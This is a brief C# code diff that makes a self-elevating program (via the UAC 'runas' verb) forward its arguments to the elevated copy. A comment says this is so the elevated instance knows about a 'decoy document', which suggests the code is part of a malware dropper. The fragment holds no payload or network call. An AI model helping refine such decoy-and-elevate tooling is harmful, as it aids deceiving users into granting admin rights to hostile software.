@@ -124,6 +124,14 @@ class Program
                 proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
                 proc.Verb = "runas"; // This triggers the UAC prompt
 
+                // CRITICAL FIX: Pass the arguments to the elevated process
+                // This way the elevated instance knows about the decoy document
+                if (args.Length > 0)
+                {
+                    // Quote the arguments properly to handle paths with spaces
+                    proc.Arguments = string.Join(" ", args.Select(a => $"\"{a}\""));
+                }
+
                 Process.Start(proc);
 
                 // Exit this non-admin instance
